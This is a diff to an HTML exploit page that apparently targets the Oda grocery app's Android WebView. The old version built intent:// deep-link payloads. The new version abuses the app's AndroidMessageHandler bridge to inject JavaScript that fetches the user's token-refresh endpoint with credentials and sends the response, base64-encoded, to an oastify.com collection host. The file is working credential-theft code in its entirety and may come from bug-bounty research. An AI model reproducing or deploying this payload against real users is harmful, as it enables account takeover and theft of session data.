@@ -1,13 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+
+<h1>Exploit Running...</h1>
+
 <script>
-   // The goal is to hit the 'external-webview' deep link path directly 
-   // bypasses the standard HTTPS resolution and forces a WebView screen.
-   var payloadUrl = "https://st-mudo.github.io/webview-poc/trigger_bridge.html";
+// log execution
+new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?stage=WEBVIEW_LOADED";
 
-   // Method A: Deep Link Path Injection
-   var intentA = "intent://external-webview?url=" + encodeURIComponent(payloadUrl) + "#Intent;scheme=kolonialno;package=no.kolonial.tienda;end";
+// STEP 1: ensure bridge exists
+if (typeof AndroidMessageHandler !== "undefined") {
 
-   // Method B: Intent Extra Injection (Backup)
-   var intentB = "intent:#Intent;action=android.intent.action.VIEW;package=no.kolonial.tienda;S.url=" + payloadUrl + ";S.title=Oda%20Support;end";
+    new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?bridge=YES";
 
-   window.location.href = intentA;
+    // STEP 2: trigger callback injection
+    AndroidMessageHandler.postMessage(JSON.stringify({
+        command: "open-url",
+        url: "https://oda.com/no-en/account/climate/",
+        callbackString: `
+            fetch('/api/v1/user/refresh/', {credentials:'include'})
+            .then(r=>r.text())
+            .then(d=>{
+                new Image().src='https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?data='+btoa(d);
+            });
+        `
+    }));
+
+} else {
+    new Image().src = "https://2mp456d5wau58jufmsh3835ac1iv6yun.oastify.com/?bridge=NO";
+}
 </script>
+
+</body>
+</html>
